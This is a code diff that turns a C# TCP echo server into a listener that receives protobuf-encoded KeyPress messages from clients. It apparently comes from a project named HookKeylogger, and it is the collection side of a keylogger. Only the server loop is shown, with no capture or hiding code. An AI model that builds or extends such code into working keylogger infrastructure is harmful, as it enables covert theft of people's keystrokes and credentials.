@@ -1,14 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
+using HookKeylogger.Base;
+using System.IO;
 
 namespace Server
 {
-    class Program
+    class Server
     {
         ///<summary>
         ///Starts the listener for the server.
@@ -45,26 +43,39 @@ namespace Server
                     data = null;
 
                     // Get a stream object for reading and writing
-                    NetworkStream stream = client.GetStream();
+                    StreamExtension stream = new StreamExtension(client.GetStream());
 
                     int i;
-
-                    // Loop to receive all the data sent by the client.
-                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
+                    KeyPress kp;
+                    while (stream.IsConnected())
                     {
-                        // Translate data bytes to a ASCII string.
-                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                        Console.WriteLine("Received: {0}", data);
-
-                        // Process the data sent by the client.
-                        data = data.ToUpper();
-
-                        byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
-
-                        // Send back a response.
-                        stream.Write(msg, 0, msg.Length);
-                        Console.WriteLine("Sent: {0}", data);
+                        try
+                        {
+                            kp = KeyPress.Parser.ParseDelimitedFrom(stream);
+                            Console.WriteLine("Received: {0}", kp);
+                        }
+                        catch (IOException)
+                        {
+                            break;
+                        }
                     }
+
+                    //// Loop to receive all the data sent by the client.
+                    //while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
+                    //{
+                    //    // Translate data bytes to a ASCII string.
+                    //    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                    //    Console.WriteLine("Received: {0}", data);
+
+                    //    // Process the data sent by the client.
+                    //    data = data.ToUpper();
+
+                    //    byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
+
+                    //    // Send back a response.
+                    //    stream.Write(msg, 0, msg.Length);
+                    //    Console.WriteLine("Sent: {0}", data);
+                    //}
 
                     // Shutdown and end connection
                     client.Close();
